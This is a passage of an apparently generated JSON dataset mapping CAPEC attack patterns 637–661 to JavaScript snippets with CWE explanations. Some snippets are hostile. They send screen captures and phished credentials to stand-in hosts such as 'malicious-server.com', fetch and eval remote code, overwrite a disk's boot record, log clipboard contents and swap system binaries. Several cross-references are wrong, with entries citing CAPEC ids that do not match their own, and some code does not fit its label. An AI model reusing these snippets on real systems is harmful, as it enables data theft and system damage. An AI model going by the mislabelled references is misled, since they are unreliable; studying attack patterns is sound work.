        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to hide malicious code in an image file's metadata\nfunction hideMaliciousCode(imagePath, maliciousCode) {\n  const imageBuffer = fs.readFileSync(imagePath);\n  const metadata = `<!-- ${maliciousCode} -->`;\n  const hiddenData = Buffer.concat([imageBuffer, Buffer.from(metadata)]);\n  fs.writeFileSync(imagePath, hiddenData);\n}\n\n// Example usage\nconst imagePath = path.join(__dirname, 'example.jpg');\nconst maliciousCode = 'console.log(\"Malicious code executed\");';\nhideMaliciousCode(imagePath, maliciousCode);",
        "description": "This JavaScript code snippet demonstrates how an attacker might hide malicious code within the metadata of an image file. The `hideMaliciousCode` function reads the image file into a buffer, appends a comment containing the malicious code to the buffer, and then writes the modified buffer back to the file. This embodies the CAPEC concept of hiding malicious data within files. The related CWEs are represented as follows: CWE-506 (Embedded Malicious Code) by embedding the malicious code in the image metadata, CWE-219 (Storage of File with Sensitive Data Under Web Root) by potentially placing the image file in a web-accessible directory, CWE-313 (Cleartext Storage in a File or on Disk) by storing the malicious code in cleartext within the file, CWE-318 (Cleartext Storage of Sensitive Information in Executable) by analogy, as the image file could be executed in a certain context, and CWE-515 (Covert Storage Channel) by using the image file's metadata as a covert channel to store the malicious code."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "document.addEventListener('copy', function(event) {\n  let clipboardData = event.clipboardData || window.clipboardData;\n  let copiedText = clipboardData.getData('text');\n  // Log the copied text to the console (simulating exfiltration)\n  console.log('Copied text:', copiedText);\n  // Store the copied text in local storage (cleartext storage vulnerability)\n  localStorage.setItem('copiedText', copiedText);\n});",
        "description": "This JavaScript code snippet listens for the 'copy' event, which is triggered when a user copies text to the clipboard. When the event occurs, it retrieves the copied text from the clipboard and logs it to the console, simulating the exfiltration of sensitive information. Additionally, it stores the copied text in the browser's local storage in cleartext, demonstrating a cleartext storage vulnerability. This code embodies the main idea of CAPEC-Collect Data from Clipboard by showing how an adversary can exploit clipboard data to gather unauthorized information. The related CWEs are represented by the unsafe logging and storage of sensitive information."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\nfunction modifyMBR() {\n  // CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n  // CWE-1326: Missing Immutable Root of Trust in Hardware\n  const mbrPath = '/dev/sda'; // Path to the Master Boot Record\n  const maliciousCode = Buffer.from('malicious payload');\n\n  fs.open(mbrPath, 'r+', (err, fd) => {\n    if (err) throw err;\n    fs.write(fd, maliciousCode, 0, maliciousCode.length, 0, (err) => {\n      if (err) throw err;\n      fs.close(fd, (err) => {\n        if (err) throw err;\n        console.log('MBR modified successfully');\n      });\n    });\n  });\n}\n\n// CWE-1277: Firmware Not Updateable\nfunction executeMaliciousCode() {\n  exec('malicious_command', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// CWE-1220: Insufficient Granularity of Access Control\nif (userHasAccess) {\n  modifyMBR();\n  executeMaliciousCode();\n}",
        "description": "This JavaScript code snippet demonstrates a simplified version of an attack that modifies the Master Boot Record (MBR) to include malicious code, embodying the main idea of the CAPEC 'Altered Component Firmware'. The code leverages several related CWEs for context:\n\n1. CWE-1274: The code lacks proper access control for the MBR, allowing unauthorized modifications.\n2. CWE-1193 and CWE-1326: The code assumes the system enables untrusted execution before securing memory and lacks an immutable root of trust, making it easier to execute malicious code.\n3. CWE-1277: The code does not account for updating or patching firmware, implying persistence of the malicious code.\n4. CWE-1220: The access control check (`userHasAccess`) is overly broad, allowing unauthorized users to execute the attack.\n\nThe `modifyMBR` function opens the MBR file and writes a malicious payload to it. The `executeMaliciousCode` function runs a malicious command. The conditional check simulates insufficient access control, allowing the attack to proceed if `userHasAccess` is true."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "const fs = require('fs');\nconst path = '/tmp/sensitive_info.txt';\n\n// Writing sensitive information to a file with improper permissions\nfs.writeFileSync(path, 'Sensitive Data', { mode: 0o666 });\n\n// Reading the file without proper access control\nfs.readFile(path, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading file:', err);\n  } else {\n    console.log('File content:', data);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where sensitive information is written to a file with improper permissions (mode 0o666), making it accessible to unauthorized users. The file is then read without proper access control checks. This embodies the CAPEC 'Probe System Files' by showing how an adversary can access sensitive information due to improperly protected files. The related CWEs are represented by the insecure temporary file creation (CWE-377), files accessible to external parties (CWE-552), and exposure of sensitive information (CWE-497)."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "const fs = require('fs');\nconst vm = require('vm');\n\n// CWE-829: Including functionality from an untrusted source\nconst untrustedCode = fs.readFileSync('untrustedLibrary.js', 'utf8');\n\n// CWE-913: Improper control of dynamically-managed code resources\nconst sandbox = { process: process, require: require, console: console };\n\n// CWE-114: Process control vulnerability\ntry {\n  vm.createContext(sandbox);\n  vm.runInContext(untrustedCode, sandbox);\n} catch (e) {\n  console.error('Error executing untrusted code:', e);\n}\n\n// CWE-506: Embedded malicious code\n// The untrustedLibrary.js could contain malicious code that gets executed\n// CWE-1265: Unintended reentrant invocation\n// If the untrusted code calls non-reentrant code, it could cause issues",
        "description": "This JavaScript code snippet demonstrates the inclusion of code in an existing process, which is the main idea of the CAPEC. The code reads and executes an untrusted JavaScript file ('untrustedLibrary.js') using Node.js's 'fs' and 'vm' modules. This represents CWE-829 by including functionality from an untrusted source. The 'vm' module creates a sandbox environment, but improper control (CWE-913) could allow the untrusted code to access sensitive resources. The try-catch block attempts to execute the untrusted code, representing a process control vulnerability (CWE-114). The untrusted code could contain malicious payloads (CWE-506) or cause unintended reentrant invocations (CWE-1265). This snippet highlights the risks of executing untrusted code within an existing process, potentially leading to privilege escalation and evasion of detection."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "const { exec } = require('child_process');\nconst path = require('path');\n\n// Vulnerable function that loads a DLL from an untrusted path\nfunction loadDLL(dllName) {\n  const dllPath = path.join(__dirname, dllName);\n  exec(`rundll32 ${dllPath},DllMain`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error loading DLL: ${error.message}`);\n      return;\n    }\n    console.log(`DLL loaded successfully: ${stdout}`);\n  });\n}\n\n// Example usage\nloadDLL('example.dll');",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that loads a DLL from an untrusted path, embodying the main idea of the CAPEC 'DLL Side-Loading'. The function 'loadDLL' constructs a path to the DLL using the current directory and the provided DLL name, then uses the 'exec' function to run the 'rundll32' command to load the DLL. This approach is vulnerable to CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path) because it does not verify the integrity or trustworthiness of the DLL being loaded. An attacker could place a malicious DLL in the same directory, leading to the execution of malicious code."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst vulnerableBinaryPath = '/usr/local/bin/vulnerableBinary';\nconst maliciousBinaryPath = '/tmp/maliciousBinary';\n\n// Check if the vulnerable binary exists and has weak permissions\nfs.stat(vulnerableBinaryPath, (err, stats) => {\n  if (err) throw err;\n  if ((stats.mode & 0o777) === 0o777) { // Weak permissions check\n    // Replace the vulnerable binary with the malicious one\n    fs.copyFile(maliciousBinaryPath, vulnerableBinaryPath, (err) => {\n      if (err) throw err;\n      console.log('Vulnerable binary replaced with malicious binary');\n    });\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker replaces a vulnerable binary with a malicious one due to weak file permissions. The code first checks if the binary at '/usr/local/bin/vulnerableBinary' exists and has weak permissions (world-writable). If the permissions are weak, it replaces the vulnerable binary with a malicious binary located at '/tmp/maliciousBinary'. This embodies the CAPEC 'Replace Binaries' by exploiting incorrect permission assignment (CWE-732) and potentially leading to the execution of malicious code (CWE-506)."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst sharedDir = '\\\\UNC\\share\\name\\';\n\nfs.readdir(sharedDir, (err, files) => {\n  if (err) {\n    console.error('Error reading directory:', err);\n    return;\n  }\n  files.forEach(file => {\n    const filePath = path.join(sharedDir, file);\n    fs.stat(filePath, (err, stats) => {\n      if (err) {\n        console.error('Error getting file stats:', err);\n        return;\n      }\n      if (stats.isFile()) {\n        fs.readFile(filePath, 'utf8', (err, data) => {\n          if (err) {\n            console.error('Error reading file:', err);\n            return;\n          }\n          console.log(`File: ${filePath}\\nContent:\\n${data}`);\n        });\n      }\n    });\n  });\n});",
        "description": "This JavaScript code snippet demonstrates how an adversary might identify and access shared files on a system. The code uses Node.js's 'fs' module to read the contents of a shared directory specified by a UNC path. It lists all files in the directory and reads their contents, potentially exposing sensitive information. This snippet embodies the CAPEC idea of discovering shared files/directories and highlights related CWEs such as CWE-40 (Path Traversal), CWE-552 (Files or Directories Accessible to External Parties), and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). The code represents a potential security risk where shared directories are not properly secured, allowing unauthorized access to sensitive files."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "const crypto = require('crypto');\nconst net = require('net');\n\n// Simulate storing password hash\nconst storedHash = crypto.createHash('md5').update('password123').digest('hex');\n\n// Simulate receiving a hash from a client\nconst clientHash = '482c811da5d5b4bc6d497ffa98491e38'; // MD5 hash of 'password123'\n\n// Single-factor authentication using hash comparison\nif (storedHash === clientHash) {\n  console.log('Authentication successful');\n} else {\n  console.log('Authentication failed');\n}\n\n// Simulate a network server vulnerable to capture-replay attack\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Assume data contains the hash\n    if (data.toString() === storedHash) {\n      socket.write('Access granted');\n    } else {\n      socket.write('Access denied');\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\nconsole.log('Server listening on port 1337');",
        "description": "This JavaScript code snippet demonstrates a vulnerable authentication mechanism that embodies the 'Use of Captured Hashes (Pass The Hash)' attack. The code simulates storing a password hash and then authenticating a client by comparing the received hash with the stored hash, which is an insecure practice (CWE-836). It also sets up a simple network server that is vulnerable to capture-replay attacks (CWE-294), where an attacker can sniff and replay the hash to gain unauthorized access. The use of single-factor authentication (CWE-308) further exacerbates the vulnerability. This example highlights the risks associated with insufficiently protected credentials (CWE-522) and the potential for authentication bypass."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// Simulate storing a Kerberos ticket insecurely\nlet ticket = 'fake_kerberos_ticket';\nfs.writeFileSync('ticket.txt', ticket);\n\n// Simulate an insecure HTTP server that can be exploited\nhttp.createServer((req, res) => {\n  if (req.url === '/login') {\n    // Insecurely read the ticket from file\n    let storedTicket = fs.readFileSync('ticket.txt', 'utf8');\n    // Simulate authentication using the ticket\n    if (req.headers['authorization'] === storedTicket) {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Authenticated');\n    } else {\n      res.writeHead(401, {'Content-Type': 'text/plain'});\n      res.end('Unauthorized');\n    }\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of Kerberos ticket handling. It simulates storing a Kerberos ticket insecurely in a file and uses an insecure HTTP server to authenticate users based on this ticket. The code embodies the main idea of CAPEC-639 (Use of Captured Tickets) by showing how an adversary could exploit insecurely stored tickets to gain unauthorized access. The related CWEs are represented as follows: CWE-522 (Insufficiently Protected Credentials) by storing the ticket in a plain text file, CWE-294 (Authentication Bypass by Capture-replay) by allowing the ticket to be replayed for authentication, and CWE-308 (Use of Single-factor Authentication) by relying solely on the ticket for authentication without additional factors."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to check for USB device connections by reading Windows registry\nfunction checkUSBDevices() {\n  const registryPath = 'C:\\\\Windows\\\\System32\\\\config\\\\SYSTEM';\n  try {\n    const data = fs.readFileSync(registryPath, 'utf8');\n    if (data.includes('USBSTOR')) {\n      console.log('USB device detected');\n    } else {\n      console.log('No USB device detected');\n    }\n  } catch (err) {\n    console.error('Error reading registry:', err);\n  }\n}\n\n// Function to search for iOS backups\nfunction searchIOSBackups() {\n  const backupPath = path.join(process.env.HOME || process.env.USERPROFILE, 'AppData', 'Roaming', 'Apple Computer', 'MobileSync', 'Backup');\n  try {\n    if (fs.existsSync(backupPath)) {\n      console.log('iOS backup found');\n    } else {\n      console.log('No iOS backup found');\n    }\n  } catch (err) {\n    console.error('Error searching for iOS backups:', err);\n  }\n}\n\ncheckUSBDevices();\nsearchIOSBackups();",
        "description": "This JavaScript code snippet demonstrates how an adversary might attempt to obtain information about attached peripheral devices and components connected to a computer system, embodying the main idea of the CAPEC 'Peripheral Footprinting'. The `checkUSBDevices` function reads the Windows registry to detect connected USB devices, which relates to CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The `searchIOSBackups` function searches for iOS backups in the user's directory, which can expose sensitive information (CWE-200). Both functions attempt to access system-level information that could be useful for further attacks."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "const registry = require('winreg');\n\nfunction readRegistryKey(keyPath, keyName) {\n  const regKey = new registry({\n    hive: registry.HKLM, // Accessing HKEY_LOCAL_MACHINE\n    key: keyPath\n  });\n\n  regKey.get(keyName, (err, item) => {\n    if (err) {\n      console.error('Error reading registry key:', err);\n    } else {\n      console.log('Registry key value:', item.value); // Sensitive information in cleartext\n    }\n  });\n}\n\n// Example usage\nreadRegistryKey('SOFTWARE\\ExampleSoftware', 'SensitiveData');",
        "description": "This JavaScript code snippet demonstrates how an adversary might exploit improper authorization and cleartext storage in the Windows Registry to gather sensitive information. The code uses the 'winreg' module to access a specific registry key and read its value. The registry key is accessed without proper authorization checks, and the sensitive information is stored in cleartext, making it vulnerable to unauthorized access. This embodies the CAPEC idea of collecting data from registries by exploiting weaknesses in authorization and storage practices."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "const captureScreen = async () => {\n  try {\n    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });\n    const videoTrack = stream.getVideoTracks()[0];\n    const imageCapture = new ImageCapture(videoTrack);\n    const bitmap = await imageCapture.grabFrame();\n    const canvas = document.createElement('canvas');\n    canvas.width = bitmap.width;\n    canvas.height = bitmap.height;\n    const context = canvas.getContext('2d');\n    context.drawImage(bitmap, 0, 0, canvas.width, canvas.height);\n    const screenshot = canvas.toDataURL('image/png');\n    // Transmit the screenshot in cleartext (CWE-319)\n    fetch('http://malicious-server.com/upload', {\n      method: 'POST',\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({ image: screenshot })\n    });\n  } catch (err) {\n    console.error('Error capturing screen:', err);\n  }\n};\n\n// Trigger the screen capture\ncaptureScreen();",
        "description": "This JavaScript code snippet demonstrates how an adversary could exploit the screen capture functionality to gather sensitive information. The `captureScreen` function uses the `navigator.mediaDevices.getDisplayMedia` API to capture the screen. It then converts the captured video frame into an image and sends it to a remote server in cleartext (CWE-319). This embodies the main idea of CAPEC-Collect Data from Screen Capture, where an adversary gathers sensitive information through screen capture. The code also highlights CWE-497 by exposing sensitive system information to an unauthorized control sphere and CWE-319 by transmitting sensitive data in cleartext."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction uploadFile(filePath) {\n  // Check if the file extension has a trailing space\n  if (filePath.endsWith(' ')) {\n    console.log('Invalid file extension with trailing space detected.');\n    return;\n  }\n\n  // Extract the file extension\n  const ext = path.extname(filePath);\n\n  // Check if the file extension is allowed\n  const allowedExtensions = ['.txt', '.jpg', '.png'];\n  if (!allowedExtensions.includes(ext)) {\n    console.log('File extension not allowed.');\n    return;\n  }\n\n  // Proceed with file upload\n  fs.copyFile(filePath, path.join(__dirname, 'uploads', path.basename(filePath)), (err) => {\n    if (err) {\n      console.error('Error uploading file:', err);\n    } else {\n      console.log('File uploaded successfully.');\n    }\n  });\n}\n\n// Example usage\nuploadFile('example.txt ');",
        "description": "This JavaScript code snippet demonstrates a file upload function that checks for a trailing space in the file extension, which is a common vulnerability described in CAPEC-46. The function `uploadFile` first checks if the file path ends with a space and rejects it if true. It then extracts the file extension and verifies if it is in the list of allowed extensions. If the extension is not allowed, the upload is aborted. If all checks pass, the file is copied to the 'uploads' directory. This code addresses CWE-46 by ensuring that file paths with trailing spaces are not accepted, thus preventing ambiguous path resolution and potential security risks."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst app = express();\nconst path = require('path');\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  // CWE-434: Unrestricted Upload of File with Dangerous Type\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) {\n      return res.status(500).send(err);\n    }\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that allows file uploads. The code demonstrates a vulnerability where an attacker can upload a web shell to the server due to insufficient file type validation (CWE-434). The uploaded file is saved directly to the server without any checks, which could allow an attacker to upload a malicious script and execute it remotely. This embodies the main idea of the CAPEC 'Upload a Web Shell to a Web Server' by exploiting the lack of proper authentication and validation mechanisms."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/record') {\n    const audioStream = fs.createWriteStream('recorded_audio.wav');\n    req.pipe(audioStream);\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Recording started');\n  } else if (req.url === '/playback') {\n    fs.readFile('recorded_audio.wav', (err, data) => {\n      if (err) {\n        res.writeHead(500, {'Content-Type': 'text/plain'});\n        res.end('Error reading file');\n      } else {\n        res.writeHead(200, {'Content-Type': 'audio/wav'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens on port 8080. It has two main functionalities: recording audio data sent to the '/record' endpoint and saving it to a file named 'recorded_audio.wav', and playing back the recorded audio when the '/playback' endpoint is accessed. This code embodies the concept of eavesdropping (CAPEC-173) by capturing and storing audio data without any encryption or authentication, making it vulnerable to unauthorized access (CWE-200, CWE-319). The recorded audio is stored in a file, which can be considered a covert storage channel (CWE-515). The lack of proper protection mechanisms (CWE-1300) makes it easy for an adversary to intercept and misuse the sensitive information."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "const kerberos = require('kerberos');\nconst fs = require('fs');\n\n// Load known Kerberos credentials from a file (CWE-522)\nconst credentials = JSON.parse(fs.readFileSync('credentials.json', 'utf8'));\n\n// Function to authenticate using Kerberos credentials\nfunction authenticate(user, password) {\n  kerberos.initializeClient(`HTTP@${user}`, (err, client) => {\n    if (err) throw err;\n    client.step('', (err, response) => {\n      if (err) throw err;\n      client.step(response, (err, finalResponse) => {\n        if (err) throw err;\n        console.log('Authenticated successfully');\n      });\n    });\n  });\n}\n\n// Simulate an attacker using known credentials (CWE-522, CWE-309)\ncredentials.forEach(cred => {\n  authenticate(cred.user, cred.password);\n});",
        "description": "This JavaScript code snippet demonstrates the use of known Kerberos credentials to authenticate against a service. The credentials are loaded from a file (CWE-522: Insufficiently Protected Credentials), and the authentication process is carried out using the Kerberos library. The code simulates an attacker using these known credentials to gain access (CAPEC: Use of Known Kerberos Credentials). The use of a single-factor authentication mechanism (CWE-309: Use of Password System for Primary Authentication) is highlighted, showing the potential risk of compromise."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst users = { 'admin': 'password123' }; // CWE-522: Insufficiently Protected Credentials\n\napp.use(bodyParser.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    // CWE-308: Use of Single-factor Authentication\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Login failed');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up a simple Express server with a login endpoint. The credentials are stored in plain text within the code (CWE-522: Insufficiently Protected Credentials). The authentication mechanism relies solely on a username and password (CWE-308: Use of Single-factor Authentication), which is a single-factor authentication method. This setup is vulnerable to attacks where an adversary guesses or obtains the credentials, as described in the CAPEC. The code does not implement measures to prevent multiple failed authentication attempts (CWE-307), nor does it use password aging (CWE-262, CWE-263), making it susceptible to brute force attacks and other security risks."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  // Create a fake login form\n  var fakeForm = document.createElement('form');\n  fakeForm.setAttribute('action', 'https://malicious-site.com/steal-credentials');\n  fakeForm.setAttribute('method', 'POST');\n  \n  var usernameField = document.createElement('input');\n  usernameField.setAttribute('type', 'text');\n  usernameField.setAttribute('name', 'username');\n  usernameField.setAttribute('placeholder', 'Username');\n  fakeForm.appendChild(usernameField);\n  \n  var passwordField = document.createElement('input');\n  passwordField.setAttribute('type', 'password');\n  passwordField.setAttribute('name', 'password');\n  passwordField.setAttribute('placeholder', 'Password');\n  fakeForm.appendChild(passwordField);\n  \n  var submitButton = document.createElement('input');\n  submitButton.setAttribute('type', 'submit');\n  submitButton.setAttribute('value', 'Login');\n  fakeForm.appendChild(submitButton);\n  \n  // Append the fake form to the body\n  document.body.appendChild(fakeForm);\n});",
        "description": "This JavaScript code snippet demonstrates a Credential Prompt Impersonation attack. When the DOM content is loaded, it creates a fake login form that mimics a legitimate credential prompt. The form's action attribute is set to a malicious URL ('https://malicious-site.com/steal-credentials'), where the entered credentials will be sent. This example embodies CWE-1021 by improperly rendering a UI layer that can confuse users, CWE-522 by potentially transmitting credentials insecurely, and CWE-798 by potentially using hard-coded credentials in a real-world scenario. The code aims to deceive users into entering their credentials, which are then sent to an attacker's server."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// Function to add data to a file to avoid security tool detection\nfunction addDataToFile(filePath, dataToAdd) {\n  try {\n    // Read the original file content\n    let fileContent = fs.readFileSync(filePath, 'utf8');\n    \n    // Add data to the file content\n    fileContent += dataToAdd;\n    \n    // Write the modified content back to the file\n    fs.writeFileSync(filePath, fileContent, 'utf8');\n    \n    // Log the new hash of the file\n    const hash = crypto.createHash('sha256').update(fileContent).digest('hex');\n    console.log(`New file hash: ${hash}`);\n  } catch (err) {\n    console.error('Error processing the file:', err);\n  }\n}\n\n// Example usage\nconst filePath = 'example.txt';\nconst dataToAdd = 'A'.repeat(1024 * 1024); // Add 1MB of data\naddDataToFile(filePath, dataToAdd);",
        "description": "This JavaScript code snippet demonstrates how an adversary might add data to a file to increase its size and change its hash, thereby avoiding detection by security tools. The `addDataToFile` function reads the content of a specified file, appends additional data to it, and writes the modified content back to the file. It then logs the new hash of the file, which would be different from the original hash, frustrating security tools that rely on hash-based detection. This snippet embodies the main idea of CAPEC-165 by showing how an attacker can manipulate file size and hash to evade security measures. The related CWEs provide context on potential vulnerabilities, such as the inclusion of sensitive information in files and the handling of dangerous file types."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Simulated database of user credentials\nconst users = {\n  'user1': 'password123',\n  'user2': 'password456'\n};\n\n// Simulated voice phishing attack\napp.post('/voice-phish', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    // CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n    res.send(`Sensitive information for ${username}: [Sensitive Data]`);\n  } else {\n    // CWE-307: Improper Restriction of Excessive Authentication Attempts\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(port, () => {\n  console.log(`Voice phishing app listening at http://localhost:${port}`);\n});",
        "description": "This JavaScript code snippet represents a simplified simulation of a voice phishing attack using an Express.js server. The server listens for POST requests at the '/voice-phish' endpoint, where it expects a username and password in the request body. If the provided credentials match those in the simulated database, it responds with sensitive information, demonstrating CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor). If the credentials do not match, it responds with an 'Unauthorized' status, but does not implement measures to prevent excessive authentication attempts, illustrating CWE-307 (Improper Restriction of Excessive Authentication Attempts). This code embodies the main idea of CAPEC-940 (Voice Phishing) by simulating how an attacker might solicit sensitive information through a voice phishing attack."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "const updateUrl = 'https://malicious.example.com/update';\n\nfunction checkForUpdates() {\n  fetch(updateUrl)\n    .then(response => response.text())\n    .then(data => {\n      if (data.includes('update available')) {\n        downloadAndUpdate(data);\n      }\n    })\n    .catch(error => console.error('Error fetching update:', error));\n}\n\nfunction downloadAndUpdate(updateData) {\n  const script = document.createElement('script');\n  script.src = updateData;\n  document.body.appendChild(script);\n}\n\n// Simulate an automatic update check\ncheckForUpdates();",
        "description": "This JavaScript code snippet demonstrates a vulnerable automated software update mechanism. The `checkForUpdates` function fetches update information from a specified URL (`updateUrl`). If the response indicates an update is available, the `downloadAndUpdate` function is called, which dynamically creates a script element and sets its source to the update data, then appends it to the document body. This process lacks integrity checks and proper validation, making it susceptible to malicious updates. The code embodies the CAPEC concept of 'Malicious Automated Software Update via Spoofing' by showing how an attacker could trick a client into downloading and executing malicious code. The related CWEs are represented by the lack of integrity checks (CWE-494), potential for embedded malicious code (CWE-506), and improper handling of client-side security (CWE-602)."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// CWE-494: Download of Code Without Integrity Check\nhttp.get('http://malicious.com/malicious_code.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n    eval(data); // Dangerous: executing downloaded code without validation\n  });\n});\n\n// Function to check for Root/Jailbreak (simplified)\nfunction isRooted() {\n  try {\n    fs.accessSync('/system/app/Superuser.apk');\n    return true;\n  } catch (e) {\n    return false;\n  }\n}\n\n// Hooking to bypass Root/Jailbreak detection\nconst originalIsRooted = isRooted;\nfunction hookedIsRooted() {\n  return false; // Bypass the check\n}\nisRooted = hookedIsRooted;\n\nif (isRooted()) {\n  console.log('Device is rooted');\n} else {\n  console.log('Device is not rooted');\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary evades Root/Jailbreak detection by hooking into the detection function. The code first downloads and executes a script from a remote location without performing any integrity checks (CWE-494). This downloaded script could contain malicious code. The `isRooted` function checks for the presence of a file that indicates the device is rooted. The adversary then hooks into this function, replacing it with a version that always returns false, thereby bypassing the Root/Jailbreak detection. This represents the main idea of the CAPEC, where an adversary uses hooking to evade security checks and potentially escalate privileges or bypass access controls."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "function checkRoot() {\n  // Debugging code left active\n  if (typeof window.__DEBUG__ !== 'undefined' && window.__DEBUG__) {\n    console.log('Debug mode is active');\n    return false;\n  }\n\n  // Simulate root detection check\n  try {\n    var rootFiles = ['/system/app/Superuser.apk', '/sbin/su', '/system/bin/su'];\n    for (var i = 0; i < rootFiles.length; i++) {\n      var xhr = new XMLHttpRequest();\n      xhr.open('HEAD', rootFiles[i], false);\n      xhr.send();\n      if (xhr.status !== 404) {\n        console.log('Root file detected: ' + rootFiles[i]);\n        return true;\n      }\n    }\n  } catch (e) {\n    console.log('Error during root detection: ' + e.message);\n  }\n  return false;\n}\n\nif (checkRoot()) {\n  console.log('Device is rooted.');\n} else {\n  console.log('Device is not rooted.');\n}",
        "description": "This JavaScript code snippet demonstrates a basic root detection mechanism for a mobile application. The `checkRoot` function checks for the presence of common root files on the device. Additionally, it includes a debug check that logs a message if debugging is active. This represents the CAPEC idea of evading root/jailbreak detection via debugging by leaving debugging code active (CWE-489). The code also simulates a root detection check by attempting to access known root files, which could expose sensitive system information (CWE-497). The presence of debugging code and the root detection logic illustrate how an adversary might exploit these weaknesses to bypass security mechanisms."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
